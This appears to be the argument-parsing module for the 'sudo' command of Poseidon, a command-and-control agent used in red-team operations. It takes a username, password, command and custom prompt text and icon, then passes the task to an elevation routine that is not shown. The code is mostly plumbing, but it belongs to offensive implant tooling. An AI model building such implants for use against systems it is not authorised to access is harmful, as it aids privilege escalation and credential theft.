package sudo

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Username       string
	Password       string
	Args           []string
	PromptText     string
	PromptIconPath string
	Command        string
}

func (e *Arguments) parseStringArray(configArray []interface{}) []string {
	urls := make([]string, len(configArray))
	if configArray != nil {
		for l, p := range configArray {
			urls[l] = p.(string)
		}
	}
	return urls
}
func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["username"]; ok {
		e.Username = v.(string)
	}
	if v, ok := alias["password"]; ok {
		e.Password = v.(string)
	}
	if v, ok := alias["prompt_text"]; ok {
		e.PromptText = v.(string)
	}
	if v, ok := alias["args"]; ok {
		e.Args = e.parseStringArray(v.([]interface{}))
	}
	if v, ok := alias["prompt_icon_path"]; ok {
		e.PromptIconPath = v.(string)
	}
	if v, ok := alias["command"]; ok {
		e.Command = v.(string)
	}
	return nil
}

func Run(task structs.Task) {
	msg := task.NewResponse()
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	sudoWithPromptOption(task, args)
	return

}
